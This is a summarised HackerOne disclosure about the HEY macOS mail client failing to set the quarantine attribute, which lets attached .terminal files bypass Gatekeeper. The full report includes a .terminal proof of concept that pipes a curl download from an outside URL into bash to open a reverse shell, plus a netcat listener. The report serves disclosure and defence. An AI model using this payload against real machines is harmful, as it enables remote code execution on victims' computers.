# Lack of com.apple.quarantine Attribute in HEY macOS Client Enables RCE via File Upload

## Metadata
- **Source:** HackerOne
- **Report:** 1019389 | https://hackerone.com/reports/1019389
- **Submitted:** 2020-10-26
- **Reporter:** hensis
- **Program:** Basecamp (HEY macOS Client)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Improper File Handling, Missing Security Controls, Remote Code Execution, Bypass of OS Security Mechanisms
- **CVEs:** None
- **Category:** memory-binary

## Summary
The HEY macOS client fails to set the com.apple.quarantine extended attribute on uploaded executable files, bypassing macOS Gatekeeper security checks. This allows attackers to send malicious executables (e.g., .terminal files) that execute without user warnings or OS validation, leading to direct remote code execution on victim machines.

## Attack scenario
1. Attacker crafts a malicious .terminal file containing a bash command that downloads and executes a backdoor payload
2. Attacker sends the crafted file as an email attachment through HEY to target victim
3. Victim downloads the attachment from HEY macOS client application
4. Victim opens/executes the .terminal file expecting normal behavior
5. macOS Gatekeeper fails to display quarantine warning because com.apple.quarantine attribute is missing
6. Malicious code executes with victim's privileges, establishing reverse shell connection to attacker's listener

## Root cause
The HEY macOS application does not set the com.apple.quarantine extended file attribute when processing downloaded/uploaded files, circumventing macOS's built-in Gatekeeper mechanism that checks unsigned binaries and enforces security policies on executable files.

## Attacker mindset
An attacker exploits the application's failure to properly tag downloaded files with security metadata, leveraging a feature (.terminal files) that macOS permits to execute shell commands. By bypassing Gatekeeper through the missing quarantine attribute, the attacker achieves direct code execution without requiring code signing or user interaction beyond opening the file.

## Defensive takeaways
- Always set com.apple.quarantine (xattr com.apple.quarantine=0081;...) on all downloaded or user-supplied files
- Implement application-level validation of executable file types before allowing execution or download
- Use proper file sandboxing and restrict executable capabilities in user-facing upload/download features
- Validate and sign all executable content; never trust user-supplied executables
- Educate users about risks of opening files from untrusted sources, but do not rely solely on user awareness
- Implement code signing requirements and enforce them at the application level
- Consider disabling or restricting execution of certain file types (.terminal, .sh, .command) in email/messaging contexts

## Variant hunting
Search for similar vulnerabilities in other macOS applications that handle file downloads or attachments: mail clients, file managers, collaboration tools, browsers. Check if applications downloading files from internet or user uploads set proper quarantine attributes. Investigate other extended attributes that may be stripped during file processing (e.g., com.apple.metadata). Test .command, .sh, and script files in similar applications.

## MITRE ATT&CK
- T1204.002
- T1566.001
- T1190
- T1036.005
- T1202

## Notes
Report references two prior related vulnerabilities (H1#470637, H1#430463) suggesting pattern of inadequate file handling in the application. The .terminal file format is particularly dangerous as it can execute arbitrary shell commands through macOS Terminal application. The vulnerability requires user interaction (opening file) but no technical sophistication from victim. Proof of concept successfully demonstrated shell callback, confirming exploitability.

## Full report
<details><summary>Expand</summary>

Hi, basecamp team.

HEY macOS client does not properly validate file uploads on its macOS inbox. That is because, by not setting the `com.apple.quarantine` attribute in the metadata of an executable file when it is uploaded, you allow the file to be executed on macOS without being checked by Gatekeeper.

Basically, the bug here is that when sending an executable as a message, when opening it, the "file cannot be opened because it is from an unidentified developer" doesn't pop-up, the executable just gets executed

As a PoC(i prepared a video) I used a `.terminal` file, containing a backdoor payload.

# Steps-to Reproduce

1) Create a .terminal file with the following code:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh;</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
```
2) Send a mail with that file as an attachment
3) open another terminal window and execute: `nc -nvl 80`
4) As a victim download and open `.terminal` file, this will gain you a shell from the terminal window were you executed `nc -nvl 80`. As you can see, there is no alert for running Executable

# PoC video

{F1052935}

# For Further Info

for further info check the following reports from the person who found this vulnerability:

- https://hackerone.com/reports/470637
- https://hackerone.com/reports/430463

## Impact

An attacker can execute code on the victim's computer via the HEY macOS app.

</details>

---
*Analysed by Claude on 2026-05-12*
